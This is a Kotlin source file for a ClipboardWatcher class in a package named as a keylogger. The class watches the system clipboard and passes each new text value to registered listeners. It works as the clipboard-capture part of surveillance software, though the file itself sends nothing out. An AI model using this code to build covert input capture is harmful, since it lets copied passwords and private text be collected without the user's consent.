package com.github.secretx33.keylogger

import kotlinx.coroutines.launch
import java.awt.datatransfer.DataFlavor
import java.awt.datatransfer.FlavorEvent
import java.awt.datatransfer.FlavorListener
import java.awt.datatransfer.Transferable

/**
 * ClipboardWatcher is a class that extends FlavorListener to watch and manage the system clipboard.
 * It can notify registered listeners when the clipboard content changes.
 *
 * @property clipboardText holds the current clipboard text (read-only)
 * @property listeners a mutable list of ClipboardListener instances that will be notified of clipboard changes
 */
class ClipboardWatcher : FlavorListener {

    @Volatile
    var clipboardText = fetchClipboardText()
        private set
    private val listeners = mutableListOf<ClipboardListener>()

    /**
     * Adds a `ClipboardListener` to the list of listeners.
     *
     * @param listener the `ClipboardListener` instance to be added
     */
    fun addListener(listener: ClipboardListener) {
        listeners += listener
    }

    /**
     * Called when the available DataFlavors change in the system clipboard.
     *
     * @param event the `FlavorEvent` containing information about the change
     */
    override fun flavorsChanged(event: FlavorEvent) {
        SYSTEM_CLIPBOARD.setContents(currentClipboardContent, null)
        val newClipboardText = fetchClipboardText().takeIf { it != clipboardText }
            ?: return
        updateClipboardText(newClipboardText)
    }

    /**
     * Updates the clipboardText property and notifies all registered listeners.
     *
     * @param newClipboardText the new text to be set as the clipboardText
     */
    private fun updateClipboardText(newClipboardText: String) {
        clipboardText = newClipboardText
        notifyListeners()
        if (IS_DEBUG_ENABLED) {
            println("The clipboard contains: $newClipboardText")
        }
    }

    /**
     * Notifies all registered listeners of a clipboard change.
     */
    private fun notifyListeners() = coroutineScope.launch {
        listeners.forEach { it(clipboardText) }
    }

    /**
     * Fetches the current text content of the system clipboard.
     *
     * @return the text content of the clipboard, or an empty string if not available
     */
    private fun fetchClipboardText(): String {
        val clipboardContents = currentClipboardContent
        return try {
            clipboardContents?.takeIf { it.isDataFlavorSupported(DataFlavor.stringFlavor) }?.let {
                it.getTransferData(DataFlavor.stringFlavor) as String?
            }.orEmpty()
        } catch (_: Exception) {
            ""
        }
    }

    /**
     * Retrieves the current clipboard content as a `Transferable` object.
     */
    private val currentClipboardContent: Transferable?
        get() = SYSTEM_CLIPBOARD.getContents(null)
}

typealias ClipboardListener = suspend (String) -> Unit